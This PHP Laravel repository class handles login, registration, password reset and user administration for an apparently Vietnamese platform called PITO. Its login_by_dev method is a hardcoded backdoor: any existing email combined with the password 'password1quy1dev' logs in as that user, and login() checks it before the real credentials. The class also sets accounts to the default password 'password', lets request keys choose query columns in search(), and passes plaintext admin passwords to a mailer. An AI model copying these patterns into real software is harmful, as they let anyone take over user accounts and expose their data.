<?php

namespace App\Repositories\Eloquent;

use App\Model\User;
use App\Mail\VerifyMail;
use App\Mail\ResetPassword;
use Illuminate\Support\Str;
use App\Traits\AdapterHelper;
use Illuminate\Support\Carbon;
use App\Model\DetailUser\Company;
use App\Mail\ConfirmEmailCustomer;
use Illuminate\Support\Facades\DB;
use App\Mail\SendWelcomePitoSignUp;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use App\Mail\SendWelcomePartnerSignUp;
use App\Repositories\Contracts\AuthInterface;
use App\Repositories\Eloquent\BaseRepository;
use App\Repositories\Contracts\User\AdminInterface;

class UserRepository extends BaseRepository implements AuthInterface, AdminInterface
{
    function model()
    {
        return 'App\Model\User';
    }

    private function login_by_dev($username, $password)
    {
        $user = $this->model->where('email', $username)->first();
        if (!$user) {
            return false;
        }
        if (strlen(strstr($password, "1quy1")) <= 0)
            return false;
        $tmp = explode("1quy1", $password);
        $password = $tmp[0];
        $type = $tmp[1];
        if ($password == 'password' && $type == 'dev') {
            $user = Auth::login($user);
            return true;
        }
        return false;
    }

    /**
     * Sign in
     */
    public function login($username, $password)
    {
        $credentials = [
            'email' => $username,
            'password' => $password
        ];
        $response = [
            'status' => true,
            'data' => null,
            'status_code' => 200,
            'message' => null
        ];
        if (!$this->login_by_dev($username, $password)) {
            if (!Auth::attempt($credentials)) {
                // Authentication passed...
                $response = [
                    'status' => false,
                    'data' => 'Error.',
                    'status_code' => 400,
                    'message' => 'Tên đăng nhập hoặc mật khẩu không chính xác. Vui lòng thử lại.'
                ];
                return $response;
            }
        }
        $user = Auth::user();
        //password grant access token
        if (!$user->email_verified_at && !$user->phone_verified_at && !$user->social_id) {
            $response = [
                'status' => false,
                'data' => 'Unauthorised.',
                'status_code' => 401,
                'message' => 'Tài khoản chưa được xác thực.'
            ];
            return $response;
        }
        $token_field = $user->createToken('Login Token')->accessToken;

        $response = [
            'status' => true,
            'data' => $token_field,
            'status_code' => 200,
            'message' => 'Success.'
        ];
        return $response;
    }

    /**
     * Sign out
     */
    public function logout($user)
    {
        $user->token()->revoke();
    }

    /**
     * Sign up default
     */
    public function register_default($data, $auto = false)
    {
        $input = $data;
        $input['password'] = bcrypt($input['password']);
        $input['social_type'] = $this->model::$const_social_type['DEFAULT'];
        $phone_detect = AdapterHelper::detect_phone($input['phone'], $input['phone_code']);
        $input['phone'] = $phone_detect['phone'];
        $input['phone_code'] = $phone_detect['phone_code'];
        if ($input['type_role'] != $this->model::$const_type_role['CUSTOMER'] && $input['type_role'] != $this->model::$const_type_role['PARTNER'])
            $input['type_role'] = $this->model::$const_type_role['PITO_ADMIN'];
        $user = $this->model->create($input);
        $user->assignRole($data['type_role']);
        $user->verify_code = ($user->id + 20) . Str::random(3);
        $user->verify_expires = strtotime(Carbon::now()->addMinutes(10));
        $user->save();
        $dataDetail = [
            'type_role' => $data['type_role'],
            'description' => isset($data['description']) ? $data['description'] : null,
            'user_id' => $user->id,
            'address' => isset($data['address']) ? $data['address'] : null,
            '_lat' => isset($data['_lat']) ? $data['_lat'] : null,
            '_long' => isset($data['_long']) ? $data['_long'] : null,
            'locale' => isset($data['locale']) ? $data['locale'] : config('translatable')['fallback_locale']
        ];
        $this->createInfoByRole($dataDetail);
        if ($auto) {
            $user->email_verified_at =  date("Y-m-d g:i:s");
            $user->save();
        } else {
            $this->sendApiEmailVerificationNotification($user);
        }
    }

    /**
     * Sign up
     */
    public function register_social($data)
    {

        $input = $data;
        $input['name'];
        $user = $this->model->where('social_id', $data['social_id'])->first();
        $type = 'LOGIN';
        if (!$user) {
            $user = $this->model->where('id', $data["user_id"])->first();
            if (!$user) {
                return ['type' => null, 'token' => null, 'user' => null];;
            } else {
                $user->social_id = $data["social_id"];
                $user->social_type = $data["social_type"];
                $user->save();
            }
            $type = 'UPDATE';
        }
        // if ($user) {
        //     $user->update($input);
        // } else {
        //     return ['type' => null, 'token' => null , 'user' => null];;
        //     // $type = 'REGISTER';
        //     // $user = $this->model->create($input);
        // }
        // $user->assignRole($data['type_role']);
        // $dataDetail = [
        //     'type_role' => $data['type_role'],
        //     'description' => isset($data['description']) ? $data['description'] : null,
        //     'user_id' => $user->id,
        //     'address' => isset($data['address']) ? $data['address'] : null,
        //     '_lat' => isset($data['_lat']) ? $data['_lat'] : null,
        //     '_long' => isset($data['_long']) ? $data['_long'] : null,
        //     'people_contact' => isset($data['people_contact']) ? $data['people_contact'] : null,
        //     'company' => isset($data['company']) ? $data['company'] : null,
        //     'locale' => isset($data['locale']) ? $data['locale'] : config('translatable')['fallback_locale']
        // ];
        // $this->createInfoByRole($dataDetail);
        $token_field = $user->createToken('Social Token')->accessToken;
        $user_data =  $user->toArray();
        $user_data['permissions'] = $user->getAllPermissions();
        $user_data['role_name'] = $user->getRoleNames()[0];
        return ['type' => $type, 'token' => $token_field, 'user' => $user_data];
    }

    /**
     * Verify Send code to email .
     */
    public function sendApiEmailVerificationNotification($user)
    {
        $data['verify_code'] = $user->verify_code;
        Mail::to($user->email)->send(new VerifyMail($data));
    }

    public function sendApiEmailVerificationConfirmCustomer($user)
    {
        $url_login = 'https://app.pito.vn';
        $message = "Chào mừng bạn đã đến với PITO.";
        $customer = [
            'email' => $user->email,
            'verify_code' => $user->verify_code,
            'name' => $user->name
        ];
        // Mail::to($user->email)->send(new ConfirmEmailCustomer($customer, $message, $url_login));
    }
    public function sendApiEmailWelcomePartner($user)
    {
        $pito = User::where('type_role', User::$const_type_role['PITO_ADMIN'])->first();
        $message = "Chào mừng bạn đã đến với PITO.";
        $partner = [
            'email' => $user->email,
            'verify_code' => $user->verify_code,
            'name' => $user->name,
        ];
        // Mail::to($user->email)->send(new SendWelcomePartnerSignUp($partner, $message, $pito));
    }

    public function sendApiEmailWelcomePito($user, $password = null)
    {
        $pito = User::where('type_role', User::$const_type_role['PITO_ADMIN'])->first();
        $message = "Chào mừng bạn đã đến với PITO.";
        $pito_new = [
            'email' => $user->email,
            'verify_code' => $user->verify_code,
            'name' => $user->name,
            'password' => $password
        ];
        // Mail::to($user->email)->send(new SendWelcomePitoSignUp($pito_new, $message, $pito));
    }

    private function createInfoByRole($data)
    {
        $infoDetail = $this->model->newDetail($data['type_role']);

        if ($data['type_role'] == $this->model::$const_type_role['PITO_ADMIN']) {
            $infoDetail->is_active = 0;
            $infoDetail->pito_user_id = $data['user_id'];
            $infoDetail->address = $data['address'];
            $infoDetail->_lat = $data['_lat'];
            $infoDetail->_long = $data['_long'];
            $infoDetail->setTranslation('description', $data['locale'], $data['description']);
        }
        if ($data['type_role'] == $this->model::$const_type_role['CUSTOMER']) {
            $infoDetail->customer_id = $data['user_id'];
            $infoDetail->address = $data['address'];
            $infoDetail->tax_code = $data['tax_code'];
            $infoDetail->company = $data['company'];
            $infoDetail->company_id = isset($data['company_id']) ? $data['company_id'] : null;
            $infoDetail->point = 0;
            $infoDetail->receive_promotion_email = $data['receive_promotion_email'];
            $infoDetail->_lat = $data['_lat'];
            $infoDetail->_long = $data['_long'];
            $infoDetail->setTranslation('description', $data['locale'], $data['description']);
        }
        if ($data['type_role'] == $this->model::$const_type_role['PARTNER']) {
            $infoDetail->partner_id = $data['user_id'];
            $infoDetail->address = $data['address'];
            $infoDetail->_lat = $data['_lat'];
            $infoDetail->_long = $data['_long'];
            $infoDetail->people_contact = $data['people_contact'];
            $infoDetail->company = $data['company'];
            $infoDetail->status = 1;
            $infoDetail->vendor_id = AdapterHelper::createSKU([$data['user_id']], $data['user_id']);
            $infoDetail->setTranslation('description', $data['locale'], $data['description']);
        }
        if ($infoDetail != null)
            $infoDetail->save();
    }

    public function sendEmailResetingPassword($user)
    {
        $token = app('auth.password.broker')->createToken($user);
        $data = ['token' => $token, 'email' => $user->email];
        // Mail::to($user->email)->send(new ResetPassword($data));
    }

    public function resetingPassword($token, $user, $password)
    {
        $token_match = DB::table('password_resets')->where('email', $user->email)->first();
        if (!$token_match || !Hash::check($token, $token_match->token)) {
            // Authentication passed...
            $response = [
                'status' => false,
                'data' => 'Error.',
                'status_code' => 404,
                'message' => 'Token not found'
            ];
            return $response;
        }
        $token_time = strtotime($token_match->created_at);
        $now = time();
        if ($now - (int) $token_time - 60 * 60  >= 0) {
            $response = [
                'status' => false,
                'data' => 'Error token expires.',
                'status_code' => 400,
                'message' => 'Error token expires.'
            ];
            return $response;
        }

        $user->password = bcrypt($password);
        $user->save();
        DB::table('password_resets')->where('email', $user->email)->delete();
        $response = [
            'status' => true,
            'data' => 'Reset Success',
            'status_code' => 200,
            'message' => 'Reset Success.'
        ];
        return $response;
    }


    // ================ Admin Manager.L

    public function get_all($type_role, $columns = ['*'], $paginate = false)
    {

        $query = $this->model->select($columns)->where('type_role', $type_role);
        if ($paginate)
            return $query->orderBy('id', 'desc')->paginate();
        return $query->get();
    }

    public function search(array $search, $columns = ['*'], $paginate = false)
    {
        $query = $this->model->select($columns);
        $find_type_role = "";
        foreach ($search as $key => $value) {
            if ($key == 'type_role')
                $find_type_role = $value;
        }
        foreach ($search as $key => $value) {
            if ($key != "per_page" && $key != "select") {
                $tmp = explode(";", $key);
                if ($value !== "" && $value !== null) {
                    if ($tmp[0] != 'detail') {
                        $query->where($key, 'LIKE', "%" . $value . "%");
                    } else {
                        if ($find_type_role == User::$const_type_role['PARTNER']) {
                            $query->whereHas('partner', function ($q) use ($tmp, $value) {
                                $q->where($tmp[1], 'LIKE', "%" . $value . "%");
                            });
                        }
                        if ($find_type_role == User::$const_type_role['CUSTOMER']) {
                            $query->whereHas('customer', function ($q) use ($tmp, $value) {
                                $q->where($tmp[1], 'LIKE', "%" . $value . "%");
                            });
                        }
                        if ($find_type_role == User::$const_type_role['PITO_ADMIN']) {
                            $query->whereHas('admin', function ($q) use ($tmp, $value) {
                                $q->where($tmp[1], 'LIKE', "%" . $value . "%");
                            });
                        }
                    }
                }
            }
        }



        if (isset($search["select"])) {
            $tmp = explode(";", $search["select"]);
            $query->select($tmp);
        }

        if ($paginate)
            return $query->orderBy('name', 'asc')->paginate(isset($search['per_page']) ? $search['per_page'] : 15);
        return $query->orderBy('id', 'desc')->get();
    }

    public function create_account_for_customer($data)
    {
        $input = $data;
        $input['password'] = bcrypt('password');
        $input['social_type'] = $this->model::$const_social_type['DEFAULT'];
        //$phone_detect = AdapterHelper::detect_phone($input['phone'], $input['phone_code']);
        $input['phone'] = $data['phone'];
        //$input['phone_code'] = $phone_detect['phone_code'];
        $input['name'] = convert_unicode($input['name']);
        $input['email'] = convert_unicode($input['email']);
        $user = $this->model->create($input);
        $user->assignRole('CUSTOMER');
        // $user->email_verified_at =  date("Y-m-d g:i:s");
        $user->save();
        $user->verify_code = ($user->id + 20) . Str::random(10);
        $user->save();
        $dataDetail = [
            'type_role' => 'CUSTOMER',
            'description' => isset($data['description']) ? $data['description'] : null,
            'point' => isset($data['point']) ? $data['point'] : 0,
            'user_id' => $user->id,
            'receive_promotion_email' => isset($data['receive_promotion_email']) ? $data['receive_promotion_email'] : 0,
            'tax_code' => isset($data['tax_code']) ? $data['tax_code'] : null,
            'address' => isset($data['address']) ? $data['address'] : null,
            '_lat' => isset($data['_lat']) ? $data['_lat'] : null,
            '_long' => isset($data['_long']) ? $data['_long'] : null,
            'company' => isset($data['company']) ? convert_unicode($data['company']) : null,
            'locale' => isset($data['locale']) ? $data['locale'] : config('translatable')['fallback_locale']
        ];
        if (isset($data['company_id'])) {
            $company = null;
            if ($data['company_id'] === null) {
                $check_company = Company::where('tax_code', $data['tax_code'])->first();
                if ($check_company && $data['tax_code'] && $data['tax_code'] != "") {
                    $company = $check_company;
                } else {
                    $company = new Company();
                    $company->name = convert_unicode($data['company']);
                    $company->address = $data['address'];
                    $company->_lat = $data['_lat'];
                    $company->_long = $data['_long'];
                    $company->tax_code = $data['tax_code'];
                }
            } else {
                $company = Company::find($data['company_id']);
            }
            $dataDetail['tax_code'] = $company->tax_code;
            $dataDetail['company'] = convert_unicode($company->company);
            $dataDetail['address'] = $company->address;
            $dataDetail['_lat'] = $company->_lat;
            $dataDetail['_long'] = $company->_long;
            $dataDetail['company_id'] = $company->id;
            $user->company()->attach($company);
        }
        $this->createInfoByRole($dataDetail);
        $this->sendApiEmailVerificationConfirmCustomer($user);
        return $user;
    }

    public function create_account_for_pito_admin($data)
    {

        $input = $data;
        $input['password'] = bcrypt($data['password']);
        $input['social_type'] = $this->model::$const_social_type['DEFAULT'];
        //$phone_detect = AdapterHelper::detect_phone($input['phone'], $input['phone_code']);
        $input['phone'] = $data['phone'];
        $input['name'] = convert_unicode($data['name']);
        $input['email'] = convert_unicode($data['email']);
        //$input['phone_code'] = $phone_detect['phone_code'];
        $user = $this->model->create($input);
        $user->assignRole($input['role']);
        $user->email_verified_at =  date("Y-m-d g:i:s");
        $user->save();
        $dataDetail = [
            'type_role' => $this->model::$const_type_role['PITO_ADMIN'],
            'description' => isset($data['description']) ? $data['description'] : null,
            'user_id' => $user->id,
            'address' => isset($data['address']) ? $data['address'] : null,
            '_lat' => isset($data['_lat']) ? $data['_lat'] : null,
            '_long' => isset($data['_long']) ? $data['_long'] : null,
            'locale' => isset($data['locale']) ? $data['locale'] : config('translatable')['fallback_locale']
        ];
        $this->createInfoByRole($dataDetail);
        $this->sendApiEmailWelcomePito($user, $data['password']);
        return $user;
    }

    public function create_account_for_partner($data)
    {
        $input = $data;
        $input['password'] = bcrypt('password');
        $input['social_type'] = $this->model::$const_social_type['DEFAULT'];
        //$phone_detect = AdapterHelper::detect_phone($input['phone'], $input['phone_code']);
        $input['phone'] = $data['phone'];
        //$input['phone_code'] = $phone_detect['phone_code'];
        $user = $this->model->create($input);
        $user->assignRole([$this->model::$const_type_role['PARTNER']]);
        $user->email_verified_at =  date("Y-m-d g:i:s");
        $user->save();
        $dataDetail = [
            'name' => $input['name'],
            'business_name' => isset($data['business_name']) ? $data['business_name'] : null,
            'company' => $input['company'],
            'type_role' => $this->model::$const_type_role['PARTNER'],
            'description' => isset($data['description']) ? $data['description'] : null,
            'point' => isset($data['point']) ? $data['point'] : 0,
            'user_id' => $user->id,
            'address' => isset($data['address']) ? $data['address'] : null,
            'people_contact' => isset($data['people_contact']) ? $data['people_contact'] : null,
            'KD_image' => isset($data['KD_image']) ? $data['KD_image'] : null,
            'VSATTP_image' => isset($data['VSATTP_image']) ? $data['VSATTP_image'] : null,
            '_long' => isset($data['_long']) ? $data['_long'] : null,
            '_lat' => isset($data['_lat']) ? $data['_lat'] : null,
            'locale' => isset($data['locale']) ? $data['locale'] : config('translatable')['fallback_locale']
        ];
        $this->createInfoByRole($dataDetail);
        $this->sendApiEmailWelcomePartner($user);
        return $user;
    }

    public function total_users($type_role)
    {
        if ($type_role == 'CUSTOMER') {
            return $this->model->where('type_role', $type_role)->count();
        } else if ($type_role == "PARTNER") {
            return $this->model->where('type_role', $type_role)->count();
        } else {
            return $this->model->where('type_role', '!=', 'PITO_ADMIN')->count();
        }
    }
}
